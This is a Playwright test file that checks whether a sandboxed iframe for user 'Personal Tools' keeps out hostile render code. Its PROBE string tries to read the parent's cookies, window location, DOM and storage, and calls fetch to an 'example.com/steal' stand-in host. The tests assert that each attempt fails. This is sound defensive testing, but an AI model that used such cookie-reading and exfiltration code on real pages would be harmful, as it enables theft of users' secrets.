import { test, expect, type Page } from "@playwright/test";
import { buildSrcdoc } from "../src/components/tools/sandbox/runtime";
import { HOST_SOURCE, FRAME_SOURCE } from "../src/components/tools/sandbox/protocol";

// Security tests for the Personal Tools sandbox (docs/ai-tools-sandbox-plan.md).
// We mount the REAL sandbox iframe and feed it deliberately HOSTILE render code,
// then assert it cannot escape. The render code can only talk back through the
// one channel it has — ctx.addRow(...) — so the probe reports its findings there.

// A hostile render module: attempts every escape, then reports what it got.
const PROBE = `
  var out = {};
  out.cookie = (function(){ try { return String(document.cookie); } catch (e) { return "THREW:" + e.name; } })();
  out.parentHref = (function(){ try { return String(window.parent.location.href); } catch (e) { return "THREW:" + e.name; } })();
  out.parentDom = (function(){ try { return String(!!window.parent.document.body); } catch (e) { return "THREW:" + e.name; } })();
  out.topHref = (function(){ try { return String(window.top.location.href); } catch (e) { return "THREW:" + e.name; } })();
  out.storage = (function(){ try { window.localStorage.setItem("x", "1"); return "ok"; } catch (e) { return "THREW:" + e.name; } })();
  function done() { ctx.addRow(out); }
  try {
    fetch("https://example.com/steal")
      .then(function(){ out.fetch = "ok"; })
      .catch(function(e){ out.fetch = "THREW:" + (e && e.name); })
      .finally(done);
  } catch (e) { out.fetch = "THREW:" + e.name; done(); }
`;

type ProbeOutcome = {
  result?: Record<string, unknown>;
  error?: string;
  sandbox: string | null;
};

/** Mounts the real sandbox iframe in the page, runs `code`, and resolves with
 *  the first `mutate(add)` payload (the probe's findings) or an error. */
async function runProbe(
  page: Page,
  srcdoc: string,
  code: string,
): Promise<ProbeOutcome> {
  return await page.evaluate(
    ({ srcdoc, code, HOST, FRAME }) => {
      return new Promise<ProbeOutcome>((resolve) => {
        const iframe = document.createElement("iframe");
        iframe.setAttribute("sandbox", "allow-scripts");
        iframe.srcdoc = srcdoc;
        window.addEventListener("message", (ev: MessageEvent) => {
          const m = ev.data as Record<string, unknown> | null;
          if (!m || m.source !== FRAME) return;
          if (m.type === "ready") {
            iframe.contentWindow?.postMessage(
              {
                source: HOST,
                type: "init",
                schema: { layout: "table", columns: [] },
                records: [],
                code,
              },
              "*",
            );
          } else if (m.type === "mutate" && m.op === "add") {
            resolve({
              result: m.data as Record<string, unknown>,
              sandbox: iframe.getAttribute("sandbox"),
            });
          } else if (m.type === "error") {
            resolve({
              error: String(m.message),
              sandbox: iframe.getAttribute("sandbox"),
            });
          }
        });
        document.body.appendChild(iframe);
      });
    },
    { srcdoc, code, HOST: HOST_SOURCE, FRAME: FRAME_SOURCE },
  );
}

test.describe("Personal Tools sandbox isolation", () => {
  test.beforeEach(async ({ page, context }) => {
    await page.goto("/");
    // A secret on the parent origin the sandbox must never be able to read.
    await context.addCookies([
      { name: "secret", value: "TOPSECRET", url: page.url() },
    ]);
    await page.evaluate(() => {
      document.cookie = "secret2=ALSO_SECRET";
    });
  });

  test("cannot read cookies, the network, storage, or the parent window", async ({
    page,
  }) => {
    const probe = await runProbe(page, buildSrcdoc(), PROBE);
    expect(probe.error).toBeUndefined();
    const r = probe.result!;

    // Cookies: never leak the parent's secrets (opaque origin → empty or throws).
    expect(String(r.cookie)).not.toContain("TOPSECRET");
    expect(String(r.cookie)).not.toContain("ALSO_SECRET");
    // Network: blocked by CSP `default-src 'none'` + opaque origin.
    expect(String(r.fetch)).toContain("THREW");
    // Parent window / DOM: cross-origin SecurityError.
    expect(String(r.parentHref)).toContain("THREW");
    expect(String(r.parentDom)).toContain("THREW");
    expect(String(r.topHref)).toContain("THREW");
    // Storage: blocked in the opaque-origin sandbox.
    expect(String(r.storage)).toContain("THREW");
  });

  test("the only data path is the validated bridge (addRow → mutate)", async ({
    page,
  }) => {
    const probe = await runProbe(
      page,
      buildSrcdoc(),
      `ctx.addRow({ probe: "via-bridge" });`,
    );
    expect(probe.error).toBeUndefined();
    expect(probe.result).toMatchObject({ probe: "via-bridge" });
  });

  test("the iframe is sandboxed WITHOUT allow-same-origin", async ({ page }) => {
    const probe = await runProbe(
      page,
      buildSrcdoc(),
      `ctx.addRow({ ok: 1 });`,
    );
    // The dominant misconfiguration the spec warns about — fail loudly if added.
    expect(probe.sandbox).toContain("allow-scripts");
    expect(probe.sandbox).not.toContain("allow-same-origin");
  });
});
